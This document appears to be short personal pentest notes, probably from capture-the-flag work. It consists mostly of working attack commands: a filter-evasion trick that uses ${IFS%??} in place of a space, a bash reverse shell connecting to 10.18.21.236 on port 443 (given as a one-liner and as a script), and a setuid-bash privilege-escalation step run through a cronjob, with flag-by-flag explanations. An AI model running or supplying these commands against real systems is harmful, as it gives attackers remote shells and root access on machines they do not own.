`${IFS%??}` = space as in `which${IFS%??}bash`

^works on bash, not on zsh

Reverse shell:
`/bin/bash -i >& /dev/tcp/10.18.21.236/443 0>&1`

-i   interactive
`>&`: redirects both standard output (stdout) and standard error (stderr)
`0>&1`: redirects the standard input (stdin) to the same destination as standard output. This ensures that any input intended for the shell is also sent over the network connection to the attacker's machine.

-l   executes `~/.bash_profile`, `~/.bash_login`, or `~/.profile` (in that order) and inherits environment variables set in those files

rev shell file:
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.18.21.236/443 0>&1
```

To run with existing cronjob or similar:
```sh
#!/bin/bash
cp /bin/bash /tmp/mybash
chmod +xs /tmp/mybash
```
chmod +x /home/user/whatever.sh
/tmp/mybash -p

